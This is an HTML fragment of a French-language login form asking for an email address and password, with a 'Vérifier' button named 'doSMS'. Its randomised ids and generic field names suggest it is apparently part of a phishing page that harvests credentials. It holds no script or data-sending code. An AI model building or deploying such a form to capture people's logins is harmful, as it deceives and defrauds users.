                        ...
                        <div class="sc-gYbzsP brmByp">
                            <div class="sc-cCjUiG cjfGxV">
                                 <label class="sc-jcMfQk dNkBmv" for="YaWUFAYdCSElCgIt">
                                    Email                                </label>
                                <input name="one" id="YaWUFAYdCSElCgIt" type="text" class="sc-cjibBx dYWVma" value="" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,4}$"  required>
                            </div>
                        </div>
                    </div>
                    <div class="sc-iAEawV ihmKiB">
                        <div class="sc-gYbzsP brmByp">
                            <div class="sc-cCjUiG cjfGxV">
                                <label class="sc-jcMfQk dNkBmv" for="zhYediFmUtYTuikQ">
                                    Mot de passe                                </label>
                                <input name="two" id="YaWUFAYdCSElCgIt" type="password" class="sc-cjibBx dYWVma" value=""  required>
                            </div>
                        </div>
                    </div>
						<footer>
                            
                        <button type="submit" name="doSMS" class="sc-cjibBx dYWVma">Vérifier</button>
